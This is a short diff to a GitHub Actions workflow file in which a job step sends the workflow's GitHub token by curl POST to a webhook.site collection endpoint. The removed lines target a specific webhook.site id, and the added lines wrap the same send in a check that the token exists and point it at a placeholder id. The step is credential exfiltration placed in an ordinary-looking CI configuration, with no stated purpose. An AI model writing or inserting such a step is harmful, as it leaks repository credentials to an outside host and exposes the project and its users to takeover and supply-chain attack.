@@ -12,5 +12,11 @@ jobs:
         env:
           TOKEN: ${{ github.token }}
         run: |
-          curl -X POST https://webhook.site/ba751215-9a97-4bdf-b43c-6b28174b6954 \
-            --data-urlencode "token=$GITHUB_TOKEN"
+          if [ -z "$GITHUB_TOKEN" ]; then
+            echo " No token found"
+          else
+            echo " Token is present, trying to send..."
+            curl -X POST https://webhook.site/your-id \
+              --data-urlencode "token=$GITHUB_TOKEN"
+          fi
+
